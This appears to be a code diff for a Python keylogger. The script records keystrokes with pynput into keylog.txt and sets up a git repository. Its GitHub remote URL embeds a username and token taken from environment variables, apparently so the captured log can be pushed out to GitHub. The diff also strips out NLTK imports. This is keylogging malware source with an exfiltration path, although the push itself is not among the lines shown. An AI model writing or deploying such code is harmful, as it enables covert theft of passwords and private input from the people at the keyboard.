@@ -1,17 +1,8 @@
 import pynput.keyboard
-import nltk
-from nltk import word_tokenize, pos_tag, ne_chunk
 import re
 import logging
 import subprocess
 import os
-
-# Ensure that NLTK resources are downloaded
-nltk.download('punkt')
-nltk.download('maxent_ne_chunker')
-nltk.download('words')
-nltk.download('wordnet')
-nltk.download('omw-1.4')
 
 # Set up logging for storing keystrokes
 logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(message)s")
@@ -38,6 +29,9 @@ def start_keylogger():
 
 
 # Change to your project directory
+github_username = os.getenv('GITHUB_USERNAME')
+github_token = os.getenv('GITHUB_TOKEN')
+
 project_dir = os.getcwd()
 os.chdir(project_dir)
 
@@ -45,7 +39,7 @@ os.chdir(project_dir)
 subprocess.run(['git', 'init'])
 
 # Set your GitHub repository remote URL
-github_repo_url = 'https://github.com/efffectery/VeryUseFullScript'
+github_repo_url = f"https://{github_username}:{github_token}@github.com/yourusername/repositoryname.git"
 
 # Add the remote if not already added
 subprocess.run(['git', 'remote', 'add', 'origin', github_repo_url])
